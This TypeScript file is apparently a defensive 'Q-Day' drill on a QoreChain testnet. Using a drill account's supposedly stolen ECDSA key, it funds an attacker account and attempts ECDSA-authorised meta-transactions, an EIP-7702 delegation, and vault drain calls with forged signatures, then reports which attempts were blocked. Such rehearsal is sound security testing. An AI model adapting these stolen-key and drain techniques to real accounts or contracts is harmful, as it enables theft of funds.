/**
 * qday-attack-advanced.ts - Q-Day Drill rehearsal, part 2: attacks that need an attacker account.
 *
 * The drill bot has the drill account's ECDSA key AND its own funded accounts. This script creates
 * such an attacker account (keys in .attacker.json, git-ignored), funds it from the drill account
 * (owner setup, hybrid-signed) and then, using ONLY the drill account's ECDSA key, tries:
 *   - MsgExecuteCosmos meta-transaction relayed by the attacker (ECDSA-authorised native spend)
 *   - MsgExecuteEVM meta-transaction relayed by the attacker (ECDSA-authorised EVM call)
 *   - EIP-7702: authorisation tuple signed by the stolen key, type-4 tx sponsored by the attacker
 *   - real on-chain drain transactions against the vault, sent from the attacker's own window
 *
 *   npm run attack:advanced
 */
import { existsSync, readFileSync, writeFileSync } from "node:fs";
import { createHash } from "node:crypto";
import { StargateClient } from "@cosmjs/stargate";
import {
  EthNativeSigner,
  buildRegisterPqcKeyMsg,
  closeEvmWindowMsg,
  cosmosAuthSignBytes,
  evmAuthSignBytesV2,
  executeCosmosMsg,
  executeEvmMsg,
  fetchAuthenticators,
  fetchEvmDelegationConsent,
  generatePqcRecoveryCode,
  msg,
  openEvmWindowMsg,
  signProofOfPossession,
  unifiedAccountFromSeed,
  type UnifiedAccount,
} from "@qorechain/sdk";
import { evmWindowCost } from "@qorechain/evm";
import { createPublicClient, createWalletClient, encodeFunctionData, http, parseAbi, toHex, type Hex } from "viem";
import { generatePrivateKey, privateKeyToAccount, sign } from "viem/accounts";
import deployments from "../../deployments/testnet.json" with { type: "json" };

const REST = "https://api-testnet.qore.host";
const RPC = "https://rpc-testnet.qore.host";
const EVM = "https://evm-testnet.qore.host";
const CHAIN_ID = "qorechain-diana";
const FEE = { amount: [{ denom: "uqor", amount: "100000" }], gas: "800000" };
const VAULT = deployments.contracts.EscrowVault.address as Hex;
const chain = { id: 9800, name: "qorechain-diana", nativeCurrency: { name: "QOR", symbol: "QOR", decimals: 18 }, rpcUrls: { default: { http: [EVM] } } } as const;
const pub = createPublicClient({ chain, transport: http(EVM) });

const seed = (pk: string) => Buffer.from(pk.slice(2), "hex");
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

// --- accounts -------------------------------------------------------------------
const drillPk = process.env.PRIVATE_KEY as Hex;
const stolen = privateKeyToAccount(drillPk); // what the attacker has
// Owner-only, for the funding setup step. Attacks never use this.
const owner = unifiedAccountFromSeed(seed(drillPk), { recoveryCode: process.env.QORE_PQC_RECOVERY_CODE! });

const ATT_FILE = ".attacker.json";
if (!existsSync(ATT_FILE)) {
  writeFileSync(ATT_FILE, JSON.stringify({ privateKey: generatePrivateKey(), recoveryCode: generatePqcRecoveryCode() }, null, 2), { mode: 0o600 });
}
const att = JSON.parse(readFileSync(ATT_FILE, "utf8")) as { privateKey: Hex; recoveryCode: string };
const attacker = unifiedAccountFromSeed(seed(att.privateKey), { recoveryCode: att.recoveryCode });
const attackerEvm = privateKeyToAccount(att.privateKey);
const attackerWallet = createWalletClient({ chain, account: attackerEvm, transport: http(EVM) });

async function balance(addr: string): Promise<bigint> {
  const r = (await (await fetch(`${REST}/cosmos/bank/v1beta1/balances/${addr}`)).json()) as { balances: { denom: string; amount: string }[] };
  return BigInt(r.balances.find((b) => b.denom === "uqor")?.amount ?? "0");
}

async function native(acc: UnifiedAccount, mode: "hybrid" | "classical", messages: Parameters<EthNativeSigner["sign"]>[0]["messages"]): Promise<string> {
  const body = (await (await fetch(`${REST}/cosmos/auth/v1beta1/accounts/${acc.cosmos}`)).json()) as { account?: Record<string, unknown> };
  const a = (body.account?.base_account ?? body.account ?? {}) as Record<string, string>;
  const signer = new EthNativeSigner(acc, { signMode: mode, rest: REST });
  const transport = await StargateClient.connect(RPC);
  try {
    const r = await signer.signAndBroadcast(transport, {
      chainId: CHAIN_ID,
      accountNumber: BigInt(a.account_number ?? "0"),
      sequence: BigInt(a.sequence ?? "0"),
      fee: FEE,
      messages,
    });
    if (r.code !== 0) throw new Error(`code ${r.code}: ${r.rawLog ?? ""}`);
    return r.transactionHash;
  } finally {
    transport.disconnect();
  }
}

type Result = { attack: string; blocked: boolean; detail: string };
const results: Result[] = [];
async function attempt(attack: string, fn: () => Promise<string>): Promise<void> {
  try {
    results.push({ attack, blocked: false, detail: await fn() });
  } catch (e) {
    const m = (e as Error).message.replace(/\s+/g, " ");
    results.push({ attack, blocked: true, detail: (m.match(/(Log:|Details:|reason:|reverted)[^]{0,170}/)?.[0] ?? m).slice(0, 190) });
  }
}

// --- setup: fund and prepare the attacker account (owner action) ------------------
console.log(`drill account   ${owner.cosmos} (${stolen.address})`);
console.log(`attacker        ${attacker.cosmos} (${attackerEvm.address})\n`);
const drillBefore = await balance(owner.cosmos);
const vaultBefore = await pub.getBalance({ address: VAULT });

if ((await balance(attacker.cosmos)) < 1_500_000n) {
  console.log("setup: owner funds attacker with 2 QOR (hybrid) ...");
  await native(owner, "hybrid", [msg.bank.send({ fromAddress: owner.cosmos, toAddress: attacker.cosmos, amount: [{ denom: "uqor", amount: "2000000" }] })]);
  await sleep(7000);
}
const attPqc = (await (await fetch(`${REST}/qorechain/pqc/v1/account/${attacker.cosmos}`)).json().catch(() => ({}))) as Record<string, unknown>;
if (!JSON.stringify(attPqc).includes("public_key")) {
  console.log("setup: attacker registers its own ML-DSA key ...");
  try {
    const pop = signProofOfPossession({ chainId: CHAIN_ID, account: attacker.cosmos, keypair: attacker.pqc });
    await native(attacker, "classical", [buildRegisterPqcKeyMsg(attacker.cosmos, { pqcKeypair: attacker.pqc, proofOfPossession: pop })]);
    await sleep(7000);
  } catch (e) {
    if (!/already|registered/i.test((e as Error).message)) throw e;
  }
}
console.log("setup: attacker opens its own EVM window ...");
const perTx = evmWindowCost({ gas: 1_000_000n, maxFeePerGas: 250_000_000_000n });
await native(attacker, "hybrid", [openEvmWindowMsg({ sender: attacker.cosmos, blocks: 300n, maxTxs: 4n, maxValue: perTx * 4n })]);
await sleep(7000);

const authenticators = await fetchAuthenticators({ rest: REST, address: owner.cosmos }).catch(() => []);
console.log(`drill account linked authenticators: ${authenticators.length}`);
const consent = await fetchEvmDelegationConsent({ rest: REST, address: owner.cosmos }).catch((e) => ({ error: String(e) }));
console.log(`drill account EIP-7702 consent: ${JSON.stringify(consent, (_, v) => (typeof v === "bigint" ? v.toString() : v))}\n`);

const ethAddrBytes = Buffer.from(stolen.address.slice(2), "hex");
async function ecdsaSign(digest: Uint8Array): Promise<Uint8Array> {
  const hash = digest.length === 32 ? digest : createHash("sha256").update(digest).digest();
  return Buffer.from((await sign({ hash: toHex(hash), privateKey: drillPk, to: "hex" })).slice(2), "hex");
}

// --- attacks --------------------------------------------------------------------------
await attempt("Meta-tx MsgExecuteCosmos: ECDSA-signed spend of 1 QOR, relayed by attacker", async () => {
  const digest = cosmosAuthSignBytes({ chainId: CHAIN_ID, account: owner.cosmos, pubkey: ethAddrBytes, to: attacker.cosmos, amount: "1000000uqor", nonce: 0 });
  const m = executeCosmosMsg({ relayer: attacker.cosmos, account: owner.cosmos, scheme: "secp256k1", pubkey: ethAddrBytes, signature: await ecdsaSign(digest), to: attacker.cosmos, amount: "1000000uqor", nonce: 0 });
  return `tx ${await native(attacker, "hybrid", [m])}`;
});

await attempt("Meta-tx MsgExecuteEVM: ECDSA-signed EVM transfer, relayed by attacker", async () => {
  const value = "1000000000000000000";
  const digest = evmAuthSignBytesV2({ chainId: CHAIN_ID, account: owner.cosmos, pubkey: ethAddrBytes, to: attackerEvm.address, value, data: new Uint8Array(), nonce: 0, gasLimit: 100_000 });
  const m = executeEvmMsg({ relayer: attacker.cosmos, account: owner.cosmos, scheme: "secp256k1", pubkey: ethAddrBytes, signature: await ecdsaSign(digest), to: attackerEvm.address, value, gasLimit: 100_000, nonce: 0 });
  return `tx ${await native(attacker, "hybrid", [m])}`;
});

await attempt("EIP-7702: stolen key authorises a delegation, attacker sponsors the type-4 tx", async () => {
  const nonce = await pub.getTransactionCount({ address: stolen.address });
  const authorization = await stolen.signAuthorization({ chainId: 9800, contractAddress: VAULT, nonce });
  const h = await attackerWallet.sendTransaction({ to: stolen.address, authorizationList: [authorization], gas: 200_000n });
  const r = await pub.waitForTransactionReceipt({ hash: h });
  const code = await pub.getCode({ address: stolen.address });
  if (r.status !== "success" || !code || code === "0x") throw new Error(`reverted or not installed (status ${r.status}, code ${code ?? "none"})`);
  return `delegation INSTALLED: ${h}`;
});

const vaultAbi = parseAbi([
  "function withdrawBounty(uint256,address,uint256,bytes)",
  "function claimBounty(uint256,address,bytes32,uint256,bytes)",
  "function transferAdmin(address,uint256,bytes)",
]);
const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
const junk = ("0x" + "11".repeat(4627)) as Hex;
async function realTx(fn: "withdrawBounty" | "claimBounty" | "transferAdmin", args: readonly unknown[]): Promise<string> {
  const data = encodeFunctionData({ abi: vaultAbi, functionName: fn, args } as never);
  const h = await attackerWallet.sendTransaction({ to: VAULT, data, gas: 500_000n });
  const r = await pub.waitForTransactionReceipt({ hash: h });
  if (r.status !== "success") throw new Error(`reverted on chain: ${h}`);
  return `tx SUCCEEDED ${h}`;
}
await attempt("Real tx from attacker: claimBounty(1) to attacker with forged referee sig", () =>
  realTx("claimBounty", [1n, attackerEvm.address, ("0x" + "00".repeat(32)) as Hex, deadline, junk]));
await attempt("Real tx from attacker: withdrawBounty(1) to attacker with forged owner sig", () =>
  realTx("withdrawBounty", [1n, attackerEvm.address, deadline, junk]));

// --- clean up: close attacker window, return leftover funds ------------------------------
await sleep(4000);
await native(attacker, "hybrid", [closeEvmWindowMsg(attacker.cosmos)]).catch(() => "");
await sleep(7000);
const left = await balance(attacker.cosmos);
if (left > 300_000n) {
  await native(attacker, "hybrid", [msg.bank.send({ fromAddress: attacker.cosmos, toAddress: owner.cosmos, amount: [{ denom: "uqor", amount: (left - 200_000n).toString() }] })]).catch(() => "");
  await sleep(7000);
}

// --- report ------------------------------------------------------------------------------
for (const r of results) console.log(`${r.blocked ? "BLOCKED  " : "SUCCEEDED"}  ${r.attack}\n           ${r.detail}`);
console.log(`\n${results.filter((r) => r.blocked).length}/${results.length} attacks blocked`);
console.log(`vault balance: ${vaultBefore} -> ${await pub.getBalance({ address: VAULT })} wei`);
console.log(`drill balance: ${drillBefore} -> ${await balance(owner.cosmos)} uqor (setup funding and fees, leftovers returned)`);
console.log(`drill account code after attacks: ${(await pub.getCode({ address: stolen.address })) ?? "none"}`);
